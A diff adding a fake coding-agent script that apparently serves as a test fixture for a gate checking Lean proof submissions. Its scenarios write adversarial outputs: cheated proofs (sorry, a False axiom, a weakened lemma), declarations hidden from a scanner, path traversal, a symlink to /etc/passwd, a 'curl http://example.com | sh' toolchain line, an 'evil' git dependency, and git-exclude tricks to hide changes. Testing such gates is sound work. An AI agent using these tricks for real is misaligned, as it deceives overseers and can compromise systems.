@@ -1,0 +1,167 @@
+// A stand-in for a coding agent: reads the prompt on standard input and writes files into its working directory, as the
+// scenario in FAKE_SCENARIO says. It prints the keys of its environment so a test can see what it was given.
+import { mkdirSync, symlinkSync, writeFileSync, rmSync, readFileSync, existsSync } from "node:fs";
+import { dirname } from "node:path";
+
+const scenario = process.env.FAKE_SCENARIO ?? "good";
+let prompt = "";
+for await (const chunk of process.stdin) prompt += chunk;
+console.log(`env keys: ${Object.keys(process.env).sort().join(",")}`);
+console.log(`prompt bytes: ${prompt.length}`);
+import { execFileSync } from "node:child_process";
+console.log(`remotes: [${execFileSync("git", ["remote"]).toString().trim()}]`);
+console.log(`args: ${process.argv.slice(2).join(" ")}`);
+
+const DIR = "lean/SeshatLib/Combinatorics";
+const put = (path, text) => {
+  mkdirSync(dirname(path), { recursive: true });
+  writeFileSync(path, text);
+};
+
+const good = (extra = "", proof = "by\n  simp [mulDiv]", lemma = "(n : Nat) : mulDiv n 1 = n") => `import Mathlib
+
+namespace SeshatLib.Combinatorics
+
+/-- Multiply, then divide. -/
+def mulDiv (a b : Nat) : Nat := a * b / b
+
+theorem mulDiv_one ${lemma} := ${proof}
+${extra}
+end SeshatLib.Combinatorics
+`;
+
+switch (scenario) {
+  case "good":
+    put(`${DIR}/Basic.lean`, good());
+    break;
+  case "good_exit1":
+    put(`${DIR}/Basic.lean`, good());
+    console.log("done, but I am exiting with an error code");
+    process.exit(1);
+    break;
+  case "outside":
+    put(`${DIR}/Basic.lean`, good());
+    put("lean/Other/Elsewhere.lean", "import Mathlib\n");
+    break;
+  case "modify":
+    put(`${DIR}/Basic.lean`, good());
+    writeFileSync("lakefile.toml", `${readFileSync("lakefile.toml", "utf8")}\n# changed by the agent\n`);
+    break;
+  case "delete":
+    put(`${DIR}/Basic.lean`, good());
+    rmSync("lean/SeshatLib/Base.lean");
+    break;
+  case "symlink":
+    put(`${DIR}/Basic.lean`, good());
+    symlinkSync("/etc/passwd", `${DIR}/Link.lean`);
+    break;
+  case "traversal":
+    put(`${DIR}/Basic.lean`, good());
+    put(`${DIR}/../../../escape.lean`, "import Mathlib\n");
+    break;
+  case "sorry":
+    put(`${DIR}/Basic.lean`, good("", "by\n  sorry"));
+    break;
+  case "axiom":
+    put(`${DIR}/Basic.lean`, good("\naxiom cheat : False\n"));
+    break;
+  case "elab":
+    put(`${DIR}/Basic.lean`, good("\nelab \"hello\" : term => return .lit (.natVal 1)\n"));
+    break;
+  case "import_lean":
+    put(`${DIR}/Basic.lean`, good().replace("import Mathlib", "import Mathlib\nimport Lean"));
+    break;
+  case "no_test_lemma":
+    put(`${DIR}/Basic.lean`, good().replace("theorem mulDiv_one", "theorem other_name"));
+    break;
+  case "weak_test_lemma":
+    // The test lemma is proved, but it states something else than the spec's lemma does.
+    put(`${DIR}/Basic.lean`, good("", "by\n  simp [mulDiv]", "(n : Nat) : mulDiv n 1 = n ∨ n = 0"));
+    break;
+  case "prefixed_theorem":
+    // A failing theorem behind `open X in`: a scanner that reads only the start of a command never sees it.
+    put(`${DIR}/Basic.lean`, good("\nopen Nat in\ntheorem extra_fact (n : Nat) : n = n := by\n  rfl -- CERTFAIL\n"));
+    break;
+  case "native_option":
+    put(`${DIR}/Basic.lean`, good("\nset_option maxRecDepth 1000 in\ntheorem two_two : 2 + 2 = 4 := by\n  decide +native\n"));
+    break;
+  case "native_plain":
+    put(`${DIR}/Basic.lean`, good("\ntheorem two_two : 2 + 2 = 4 := by\n  native_decide\n"));
+    break;
+  case "prefixed_def":
+    put(`${DIR}/Basic.lean`, good("\nopen Nat in\ndef helperFn (a : Nat) : Nat := a\n"));
+    break;
+  case "unrecognised":
+    put(`${DIR}/Basic.lean`, good("\nattribute [simp] mulDiv\n"));
+    break;
+  case "hidden_declaration":
+    put(`${DIR}/Basic.lean`, good("\nopen Nat\n  in\ntheorem extra_fact (n : Nat) : n = n := by\n  rfl -- CERTFAIL\n"));
+    break;
+  case "shadow":
+    put(`${DIR}/Basic.lean`, good("\ninductive Nat where\n  | zeroo\n"));
+    break;
+  case "foreign_instance":
+    put(`${DIR}/Basic.lean`, good("\ninstance : Inhabited Nat := ⟨0⟩\n"));
+    break;
+  case "own_structure":
+    put(`${DIR}/Basic.lean`, good("\nstructure Point where\n  xCoord : Nat\n  yCoord : Nat\n\ninstance : Inhabited Point := ⟨⟨0, 0⟩⟩\n\ninductive Shape where\n  | circle\n  | square\n"));
+    break;
+  case "buildfail":
+    put(`${DIR}/Basic.lean`, good("\n-- BUILDFAIL\n"));
+    break;
+  case "certfail":
+    put(`${DIR}/Basic.lean`, good("\ntheorem extra_fact (n : Nat) : n = n := by\n  rfl -- CERTFAIL\n"));
+    break;
+  case "cert_unavailable":
+    put(`${DIR}/Basic.lean`, good("\n-- CERTUNAVAILABLE\n"));
+    break;
+  case "build_warns_sorry":
+    put(`${DIR}/Basic.lean`, good("\n-- BUILDWARNS\n"));
+    break;
+  case "port":
+    put("lean/ports/Foo/lakefile.toml", 'name = "Foo"\n');
+    put("lean/ports/Foo/Foo.lean", "import Mathlib\n\nnamespace Foo\n\ntheorem two_eq : 1 + 1 = 2 := by\n  norm_num\n\nend Foo\n");
+    break;
+  case "port_meta":
+    put("lean/ports/Foo/Foo.lean", "import Lean\nimport Mathlib\n\nnamespace Foo\n\nmacro \"two\" : term => `(2)\n\ntheorem two_eq : 1 + 1 = 2 := by\n  norm_num\n\nend Foo\n");
+    break;
+  case "port_lakefile_lean":
+    put("lean/ports/Foo/lakefile.lean", 'import Lake\nopen Lake DSL\npackage Foo\n');
+    put("lean/ports/Foo/Foo.lean", "import Mathlib\n\nnamespace Foo\n\ntheorem two_eq : 1 + 1 = 2 := by\n  norm_num\n\nend Foo\n");
+    break;
+  case "port_toml_require":
+    put("lean/ports/Foo/lakefile.toml", 'name = "Foo"\n\n[[require]]\nname = "evil"\ngit = "https://example.com/evil"\n');
+    put("lean/ports/Foo/Foo.lean", "import Mathlib\n\nnamespace Foo\n\ntheorem two_eq : 1 + 1 = 2 := by\n  norm_num\n\nend Foo\n");
+    break;
+  case "port_unknown_command":
+    put("lean/ports/Foo/Foo.lean", "import Mathlib\n\nnamespace Foo\n\nattribute [simp] Nat.add_comm\n\ntheorem two_eq : 1 + 1 = 2 := by\n  norm_num\n\nend Foo\n");
+    break;
+  case "port_bad_toolchain":
+    put("lean/ports/Foo/lean-toolchain", "curl http://example.com | sh\n");
+    put("lean/ports/Foo/Foo.lean", "import Mathlib\n\nnamespace Foo\n\ntheorem two_eq : 1 + 1 = 2 := by\n  norm_num\n\nend Foo\n");
+    break;
+  case "huge_file":
+    put(`${DIR}/Basic.lean`, good());
+    put(`${DIR}/Huge.lean`, `import Mathlib\n-- ${"x".repeat(700 * 1024)}\n`);
+    break;
+  case "odd_name":
+    put(`${DIR}/Basic.lean`, good());
+    put(`${DIR}/Bаsic.lean`, "import Mathlib\n");
+    break;
+  case "short_field":
+    put(`${DIR}/Basic.lean`, good("\nstructure Pt where\n  x : Nat\n"));
+    break;
+  case "nothing":
+    break;
+  case "hang":
+    await new Promise((resolve) => setTimeout(resolve, 60_000));
+    break;
+  case "ignore_git":
+    // Rewrites the clone's git directory to hide its changes; the gate does not read it.
+    put(`${DIR}/Basic.lean`, good());
+    if (existsSync(".git")) writeFileSync(".git/info/exclude", "*\n");
+    break;
+  default:
+    console.error(`unknown scenario ${scenario}`);
+    process.exit(2);
+}
